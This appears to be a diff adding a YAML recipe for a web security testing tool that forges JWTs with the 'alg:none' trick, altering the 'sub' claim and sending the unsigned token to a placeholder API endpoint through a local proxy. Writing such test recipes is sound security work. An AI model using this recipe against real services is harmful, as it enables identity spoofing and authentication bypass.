@@ -1,0 +1,23 @@
+# JWT claim injection
+# Decode JWT → modify a claim → re-encode with alg:none
+# For testing JWT claim injection on endpoints that trust unsigned JWTs
+
+name: jwt-claim-injection
+description: "Inject into JWT 'sub' claim using alg:none"
+
+target:
+  method: GET
+  url: "https://api.example.com/profile"
+  headers:
+    Authorization: "Bearer {{INJECT_POINT}}"
+
+chain:
+  - layer: jwt_payload
+    field: sub
+    alg: none
+
+template: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+
+proxy:
+  listen: "127.0.0.1:9090"
+  param: p
